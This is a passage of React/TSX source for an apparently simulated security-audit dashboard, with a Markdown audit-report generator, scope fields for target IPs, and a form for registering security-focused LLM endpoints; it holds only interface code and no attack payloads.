                  `[REASONER-LLAMA3] Rule applied: ${cmd}`
                ]);
              }}
            />

            {/* COLUMN 2: Audit Document Generator - Prominent Independent Master Block */}
            <div className="bg-[#10141f] border border-gray-800 rounded-xl p-6 md:p-8 relative overflow-hidden transition-all duration-300 shadow-xl" id="audit-document-generator-master">
              {/* Decorative dynamic ambient glow */}
              <div className="absolute top-0 right-0 w-80 h-80 bg-purple-500/5 rounded-full blur-3xl pointer-events-none"></div>
              
              {/* Box header containing prominent branding label and adjust buttons */}
              <div className="flex flex-col xl:flex-row items-stretch xl:items-center justify-between border-b border-gray-800 pb-5 mb-6 gap-4">
                <div className="flex items-start md:items-center gap-3">
                  <div className="p-3 bg-purple-900/20 border border-purple-500/20 rounded-xl hidden sm:block">
                    <FileText size={24} className="text-purple-400 animate-pulse" />
                  </div>
                  <div>
                    <h2 className="text-base md:text-lg font-black tracking-wider text-white flex flex-wrap items-center gap-2">
                      {tVal('documentGen')}
                      <span className="bg-purple-500/10 text-purple-400 border border-purple-500/30 text-[10px] uppercase font-mono font-black px-2 py-0.5 rounded">
                        Llama-3 Auto-Compile Mode
                      </span>
                    </h2>
                    <p className="text-xs text-gray-400 mt-1">
                      {activeLang === 'zh' 
                        ? '實時安全漏洞溯源日誌編譯系統。提供高自由度參數定製、主動編碼調整與格式化輸出。' 
                        : activeLang === 'ja' 
                        ? 'Llama-3 が自動構築したSOC公認監査報告書の編集コントロールセンター。' 
                        : 'Real-time compilation of verified vulnerabilities. Customize scope metrics, add compliance remarks, and export reports.'}
                    </p>
                  </div>
                </div>

                {/* Highly interactive workspace controllers to solve too-small interfaces */}
                <div className="flex flex-wrap items-center gap-3 bg-black/40 p-2 border border-gray-850 rounded-xl">
                  
                  {/* Font Size Tuner Block */}
                  <div className="flex items-center gap-1.5 bg-gray-900/60 p-1 rounded-lg border border-gray-800">
                    <span className="text-[10px] text-gray-500 uppercase font-black px-2 tracking-wider font-mono">
                      Font Size:
                    </span>
                    <button 
                      onClick={() => setReportFontSize(prev => Math.max(10, prev - 1))}
                      className="w-7 h-7 bg-black hover:bg-gray-800 border border-gray-800 hover:border-purple-500/40 text-xs font-black text-gray-400 hover:text-white rounded flex items-center justify-center transition-all cursor-pointer"
                      title="Shrink Text"
                    >
                      A-
                    </button>
                    <span className="text-xs font-mono font-black text-[#00FF66] min-w-[2.5rem] text-center">
                      {reportFontSize}px
                    </span>
                    <button 
                      onClick={() => setReportFontSize(prev => Math.min(22, prev + 1))}
                      className="w-7 h-7 bg-black hover:bg-gray-800 border border-gray-800 hover:border-purple-500/40 text-xs font-black text-gray-400 hover:text-white rounded flex items-center justify-center transition-all cursor-pointer"
                      title="Enlarge Text"
                    >
                      A+
                    </button>
                  </div>

                  {/* Template reset indicator */}
                  <button 
                    onClick={() => {
                      const baseRawMarkdown = getSimulatedReportMarkdown();
                      const customAppendix = reportRemarks ? `\n\n## Custom Auditor Remarks\n- ${reportRemarks}` : '';
                      setReportContent(baseRawMarkdown + customAppendix);
                      setReasoningLogs(prev => [...prev, "[SYSTEM] Recompiled template with standard configurations."]);
                    }}
                    className="px-3 py-1.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 text-xs font-bold text-gray-400 hover:text-white hover:border-purple-500/20 rounded-lg transition-all flex items-center gap-1.5 cursor-pointer"
                  >
                    <RefreshCw size={12} />
                    {activeLang === 'zh' ? '還原原始默認' : activeLang === 'ja' ? '同期をクリア' : 'Load Default'}
                  </button>

                </div>
              </div>

              {/* Unified Two-Column Workstation Configuration Grid with enhanced spacing and heights */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 items-stretch">
                
                {/* 1. Left Config column */}
                <div className="bg-black/50 border border-gray-850 rounded-xl p-5 md:p-6 flex flex-col justify-between space-y-6">
                  <div className="space-y-4">
                    <div className="flex items-center gap-2 text-xs font-black text-purple-400 uppercase tracking-widest border-b border-gray-900 pb-2">
                      <Sparkles size={14} className="text-purple-400 animate-spin" style={{ animationDuration: '6s' }} />
                      <span>{activeLang === 'zh' ? '1. 第一步：配置審計範圍變量' : activeLang === 'ja' ? '1. スコープ＆メタデータ変更' : '1. Configure Scope Parameters'}</span>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      <div>
                        <label className="text-[10px] font-black text-gray-500 uppercase block mb-1">Target IP Address</label>
                        <input 
                          type="text" 
                          value={targetIP}
                          onChange={(e) => setTargetIP(e.target.value)}
                          className="w-full bg-[#111] border border-gray-800 hover:border-gray-700 focus:border-purple-500/50 rounded-lg p-2.5 text-xs text-white outline-none font-mono transition-all font-bold"
                        />
                      </div>
                      <div>
                        <label className="text-[10px] font-black text-gray-500 uppercase block mb-1">Domain Scope</label>
                        <input 
                          type="text" 
                          value={targetDomain}
                          onChange={(e) => setTargetDomain(e.target.value)}
                          className="w-full bg-[#111] border border-gray-800 hover:border-gray-700 focus:border-purple-500/50 rounded-lg p-2.5 text-xs text-white outline-none font-mono transition-all font-bold"
                        />
                      </div>
                    </div>

                    <div>
                      <label className="text-[10px] font-black text-gray-500 uppercase block mb-1">Detected Audit Boundary Targets</label>
                      <div className="p-3 bg-black border border-gray-850 rounded-lg space-y-2 text-[11px] font-mono">
                        <div className="flex justify-between items-center text-gray-400 border-b border-gray-900/50 pb-1.5">
                          <span>10.10.12.31 (Prod-Web-01)</span>
                          <span className="text-red-400 font-bold">{activeLang === 'zh' ? 'SSH已失陷' : 'COMPROMISED'}</span>
                        </div>
                        <div className="flex justify-between items-center text-gray-400 border-b border-gray-900/50 pb-1.5">
                          <span>10.10.42.5 (LDAP replica-01)</span>
                          <span className="text-yellow-500 font-bold">{activeLang === 'zh' ? 'LDAP明文暴露' : 'VULNERABLE'}</span>
                        </div>
                        <div className="flex justify-between items-center text-gray-400">
                          <span>{targetIP} (PostgreSQL Core)</span>
                          <span className="text-[#00FF66] font-bold">{activeLang === 'zh' ? '極高風險注入' : 'EXPOSED'}</span>
                        </div>
                      </div>
                    </div>

                    <div>
                      <label className="text-[10px] font-black text-gray-500 uppercase block mb-1">
                        {activeLang === 'zh' ? '2. 第二步：在報告尾部加入安全加固建議' : activeLang === 'ja' ? '2. 防禦対策として備考を追加' : '2. Add Custom Defense Recommendations'}
                      </label>
                      <textarea
                        value={reportRemarks}
                        onChange={(e) => setReportRemarks(e.target.value)}
                        placeholder={activeLang === 'zh' 
                          ? '例：對 Postgres (Port 5432) 資料庫實行入站防火牆嚴格白名單限制。全面開啟 2FA 機制進行密碼加固維護。' 
                          : activeLang === 'ja' 
                          ? '例：Postgres の入方向ポートを完全に遮断し、SSHを公開鍵認証方式に強制変更することをお勧めします。' 
                          : 'Example: Set strict whitelist constraints on PostgreSQL port 5432. Upgrade all host keys to 2FA authentication.'}
                        className="w-full h-24 bg-[#111] border border-gray-800 hover:border-gray-700 focus:border-purple-500/50 rounded-lg p-3 text-xs text-gray-300 outline-none transition-all resize-none custom-scrollbar leading-relaxed"
                      />
                    </div>
                  </div>

                  <div className="pt-4 border-t border-gray-900 space-y-2">
                    <button 
                      onClick={() => {
                        const rawTemplate = getSimulatedReportMarkdown();
                        const customAppendix = reportRemarks ? `\n\n## Custom Auditor Remarks\n- ${reportRemarks}` : '';
                        setReportContent(rawTemplate + customAppendix);
                        setReasoningLogs(prev => [...prev, "[SYSTEM] Recompiled custom audit report with active workspace parameters."]);
                        alert(activeLang === 'zh' 
                          ? '主機變量與防禦建議已整合編譯進右側預覽視窗！' 
                          : activeLang === 'ja' 
                          ? '設定スコープと監査ノートを右側マークダウンに同期反映しました。' 
                          : 'Successfully refreshed markdown draft preview.');
                      }}
                      className="w-full py-2.5 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 border border-purple-500/30 text-white rounded-lg text-xs font-black uppercase tracking-widest transition-all cursor-pointer flex items-center justify-center gap-2 font-bold shadow-lg shadow-purple-600/15"
                    >
                      <Check size={14} />
                      {activeLang === 'zh' ? '手動編譯與整合報告變量' : activeLang === 'ja' ? 'スコープを報告書へ統合' : 'Compile & Integrate Settings'}
                    </button>
                    <p className="text-[10px] text-gray-500 text-center font-mono">
                      {activeLang === 'zh' 
                        ? '※ 點擊後會與 Llama-3 聯動，將定製參數動態合成最終的 Markdown 安全稽核報告草案。' 
                        : activeLang === 'ja' 
                        ? '※ 左側パラメータは右側のエディタにリアルタイムまたは上のボタン押下で統合されます。' 
                        : 'Any parameters modified apply to the live code container.'}
                    </p>
                  </div>
                </div>

                {/* 2. Right Markdown Workstation Panel (Editable and larger display frame) */}
                <div className="bg-black border border-gray-850 rounded-xl p-5 md:p-6 flex flex-col justify-between h-[520px]">
                  <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-4">
                    <div className="flex items-center gap-2">
                      <Code size={15} className="text-purple-400" />
                      <span className="text-xs font-black uppercase tracking-widest text-white">
                        {tVal('liveReportPreview')}
                      </span>
                    </div>
                    <span className="text-[9px] font-mono text-[#00FF66] bg-[#00FF66]/10 px-2 py-0.5 rounded border border-[#00FF66]/20 font-black">
                      EDITABLE WYSIWYG PREVIEW
                    </span>
                  </div>

                  {/* Rich Editable Area */}
                  <div className="flex-1 min-h-0 flex flex-col relative">
                    <textarea 
                      value={reportContent}
                      onChange={(e) => setReportContent(e.target.value)}
                      style={{ fontSize: `${reportFontSize}px` }}
                      className="w-full h-full p-4 bg-[#050507] border border-gray-900 rounded-lg font-mono text-gray-300 overflow-y-auto block custom-scrollbar outline-none focus:border-purple-500/40 resize-none leading-relaxed select-text selection:bg-purple-600/30"
                      placeholder="# Loading Llama-3 Security Report..."
                    />
                  </div>

                  {/* Character/Status Indicator */}
                  <div className="py-2 flex items-center justify-between text-[10px] text-gray-500 font-mono tracking-wide border-t border-gray-900/40 mt-1">
                    <span>LENGTH: {reportContent.length} chars</span>
                    <span className="text-purple-400 font-bold uppercase">{activeLang === 'zh' ? '● 動態安全沙箱已就緒' : '● SEC-SANDBOX ONLINE'}</span>
                  </div>

                  {/* Large Prominent Action Export Bar */}
                  <div className="grid grid-cols-2 gap-3 pt-3 border-t border-gray-900">
                    <button 
                      onClick={() => {
                        const element = document.createElement("a");
                        const file = new Blob([reportContent], {type: 'text/plain'});
                        element.href = URL.createObjectURL(file);
                        element.download = `security-threat-report-${targetIP}.md`;
                        document.body.appendChild(element);
                        element.click();
                        document.body.removeChild(element);
                        setReasoningLogs(prev => [...prev, `[SYSTEM] Exported localized markdown file (for target ip ${targetIP}).`]);
                      }}
                      className="w-full py-3 bg-purple-600 hover:bg-purple-700 text-white rounded-lg text-xs font-black uppercase tracking-widest transition-colors flex items-center justify-center gap-2 cursor-pointer shadow-lg shadow-purple-600/10 font-bold hover:scale-[1.01]"
                    >
                      <Download size={14} /> {tVal('exportMarkdown')}
                    </button>

                    <button 
                      onClick={() => alert(activeLang === 'zh' ? '正在編譯 Llama-3 攻擊溯源安全日誌，合規 PDF 即將在本地生成下載。' : activeLang === 'ja' ? 'Llama-3 攻撃ログ監査報告書をコンパイル中。まもなくPDFダウンロードリンクを生成します。' : 'PDF generation process initiated. Compiling Llama-3 attack trace logs... Download available shortly.')}
                      className="w-full py-3 bg-gray-950 hover:bg-gray-900 border border-gray-800 hover:border-gray-700 text-gray-300 hover:text-white rounded-lg text-xs font-black uppercase tracking-widest transition-all flex items-center justify-center gap-2 cursor-pointer font-bold hover:scale-[1.01]"
                    >
                      <FileText size={14} /> {tVal('exportPDF')}
                    </button>
                  </div>
                </div>

              </div>

            </div>

          </div>
        )}

        {/* Page CONFIG: Dedicated Model Configuration Manager (Where users can view/select/add security LLMs) */}
        {activePage === 'config' && (
          <div className="space-y-6">
            
            {/* Grid Split: Left 2 Cols Model List, Right 1 Col Add Model Form */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              
              {/* Left Side: Active Registered Security Models List */}
              <div className="lg:col-span-2 bg-[#0c1015] border border-gray-800 rounded-xl p-6">
                <div className="flex items-center justify-between border-b border-gray-900 pb-4 mb-4">
                  <div className="flex items-center gap-2">
                    <Sliders className="text-purple-400" size={16} />
                    <h3 className="text-xs uppercase font-black tracking-widest text-white">
                      {tVal('registeredModels')}
                    </h3>
                  </div>
                  <span className="text-[10px] font-mono text-[#00FF66] font-bold uppercase bg-[#00FF66]/10 px-2 py-0.5 rounded border border-[#0000]/10">
                    {models.length} {tVal('nodesLoaded')}
                  </span>
                </div>

                <div className="space-y-3 max-h-[460px] overflow-y-auto pr-1 custom-scrollbar">
                  {models.map((mo) => (
                    <div 
                      key={mo.id} 
                      className={cn(
                        "p-4 rounded-lg border text-xs flex flex-col md:flex-row md:items-center justify-between gap-4 transition-all",
                        mo.status === 'active' 
                          ? "bg-black/35 border-gray-800/80 hover:border-purple-500/30" 
                          : "bg-black/10 border-gray-900/60 opacity-60"
                      )}
                    >
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <span className={cn(
                            "w-2 h-2 rounded-full",
                            mo.status === 'active' ? "bg-[#00FF66] shadow-[0_0_6px_#00FF66]" : "bg-red-500"
                          )}></span>
                          <span className="font-black text-sm text-white font-sans">{mo.name}</span>
                          <span className={cn(
                            "text-[8px] font-mono uppercase px-1.5 py-0.5 rounded font-black",
                            mo.type === 'Foundation' ? "bg-blue-600/15 text-blue-400 border border-blue-500/25" :
                            mo.type === 'Agent' ? "bg-purple-600/15 text-purple-400 border border-purple-500/25" :
                            "bg-red-600/15 text-red-400 border border-red-500/25"
                          )}>
                            {mo.type}
                          </span>
                        </div>
                        <div className="grid grid-cols-2 gap-x-4 text-[10px] font-mono text-gray-500 pt-1">
                          <div><span className="text-gray-600">Provider:</span> <span className="text-gray-300">{mo.provider}</span></div>
                          <div><span className="text-gray-600">Latency:</span> <span className="text-[#00FF66] font-bold">{mo.latency}ms</span></div>
                          <div className="col-span-2 truncate pt-0.5"><span className="text-gray-600">Endpoint:</span> <code className="text-gray-400">{mo.endpoint}</code></div>
                        </div>
                      </div>

                      <div className="flex items-center gap-2.5 self-end md:self-auto">
                        <div className="flex flex-col items-end mr-2">
                          <label className="text-[9px] text-gray-600 font-bold uppercase">{activeLang === 'zh' ? '回應對比溫度' : activeLang === 'ja' ? '温度' : 'Temperature'}</label>
                          <span className="font-mono text-[10px] text-gray-300">{mo.temperature}</span>
                        </div>

                        {/* Connection Toggle */}
                        <button
                          onClick={() => toggleModelStatus(mo.id)}
                          className={cn(
                            "p-2 rounded border transition-colors cursor-pointer",
                            mo.status === 'active' 
                              ? "bg-[#00FF66]/15 hover:bg-[#00FF66]/25 border-[#00FF66]/30 text-[#00FF66]" 
                              : "bg-gray-900 border-gray-800 text-gray-500 hover:text-white"
                          )}
                          title="Toggle Connection State"
                        >
                          <Power size={13} />
                        </button>

                        {/* Delete Custom Model */}
                        {mo.isCustom && (
                          <button
                            onClick={() => handleDeleteModel(mo.id)}
                            className="p-2 bg-red-600/10 hover:bg-red-600/20 text-red-400 rounded border border-red-500/25 transition-colors cursor-pointer"
                            title="De-register custom endpoint"
                          >
                            <Trash2 size={13} />
                          </button>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Right Side: Register a New Model / API Endpoint Form */}
              <div className="lg:col-span-1 bg-[#0c1015] border border-gray-800 rounded-xl p-6 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-32 h-32 bg-purple-600/2 rounded-full blur-3xl pointer-events-none"></div>
                <div className="flex items-center justify-between border-b border-gray-900 pb-4 mb-4">
                  <div className="flex items-center gap-2">
                    <Plus className="text-[#00FF66]" size={16} />
                    <h3 className="text-xs uppercase font-black tracking-widest text-[#00FF66]">
                      {tVal('addCustomModel')}
                    </h3>
                  </div>
                </div>

                <form onSubmit={handleAddCustomModel} className="space-y-4 text-xs">
                  <div>
                    <label className="text-[10px] block text-gray-500 font-black uppercase mb-1">{tVal('modelName')}</label>
                    <input 
                      type="text" 
                      value={newModelName}
                      onChange={(e) => setNewModelName(e.target.value)}
                      placeholder="e.g., Zysec-AntiAbuse-13B"
                      className="w-full bg-black/60 border border-gray-800 focus:border-[#00FF66]/50 text-xs px-2.5 py-1.5 rounded text-white outline-none"
                      required
                    />
                  </div>

                  <div>
                    <label className="text-[10px] block text-gray-500 font-black uppercase mb-1">{tVal('providerEngine')}</label>
                    <input 
                      type="text" 
                      value={newModelProvider}
                      onChange={(e) => setNewModelProvider(e.target.value)}
                      placeholder="e.g., local Ollama, Claude, fine-tuned"
                      className="w-full bg-black/60 border border-gray-800 focus:border-[#00FF66]/50 text-xs px-2.5 py-1.5 rounded text-white outline-none"
                    />
                  </div>

                  <div>
                    <label className="text-[10px] block text-gray-500 font-black uppercase mb-1">{tVal('layerArchitecture')}</label>
                    <select 
                      value={newModelType} 
                      onChange={(e) => setNewModelType(e.target.value as any)}
                      className="w-full bg-black/80 border border-gray-800 text-xs px-2.5 py-1.5 rounded text-white outline-none font-sans cursor-pointer"
                    >
                      <option value="Foundation">Foundation Backbone LLM</option>
                      <option value="Agent">Agent Engine Helper (CAI/Pentest)</option>
                      <option value="RedTeam">Adversarial & model testing (Red Teaming)</option>
                    </select>
                  </div>

                  <div>
                    <label className="text-[10px] block text-gray-500 font-black uppercase mb-1">{tVal('apiBaseRoute')}</label>
                    <input 
                      type="text" 
                      value={newModelEndpoint}
                      onChange={(e) => setNewModelEndpoint(e.target.value)}
                      placeholder="http://127.0.0.1:11434/v1/chat"
                      className="w-full bg-black/60 border border-gray-800 focus:border-[#00FF66]/50 text-xs px-2.5 py-1.5 rounded font-mono text-white outline-none"
                      required
                    />
                  </div>

                  <div>
                    <div className="flex justify-between items-center mb-1">
                      <label className="text-[10px] text-gray-500 font-black uppercase">Preset Temperature: {newModelTemp}</label>
                      <span className="text-[8px] text-gray-600 font-black">{tVal('lowTempLabel')}</span>
                    </div>
                    <input 
                      type="range" 
                      min="0" 
                      max="1" 
                      step="0.05"
                      value={newModelTemp}
                      onChange={(e) => setNewModelTemp(parseFloat(e.target.value))}
                      className="w-full text-purple-600 cursor-pointer accent-purple-600 h-1 rounded"
                    />
                  </div>

                  {addModelError && (
                    <div className="p-2.5 bg-red-600/10 border border-red-500/0.25 rounded text-xs text-red-400">
                      {addModelError}
                    </div>
                  )}

                  <button 
                    type="submit" 
                    className="w-full py-2.5 bg-purple-600 hover:bg-purple-700 text-white rounded-lg text-xs font-black uppercase tracking-widest transition-colors flex items-center justify-center gap-2 cursor-pointer shadow-lg shadow-purple-600/10 font-bold"
                  >
                    <Plus size={13} /> {tVal('registerModelButton')}
                  </button>
                </form>

                {/* API Endpoint integration notes */}
                <div className="border-t border-gray-800/80 pt-4 mt-4 text-[10px] text-gray-500 space-y-1 font-mono leading-normal">
                  <span className="font-sans font-black text-[11px] text-gray-400 uppercase block mb-1">{tVal('integrationGuideline')}</span>
                  <p>{tVal('integrationDesc')}</p>
                </div>
              </div>

            </div>

          </div>
        )}
      </div>

    </div>
  );
}
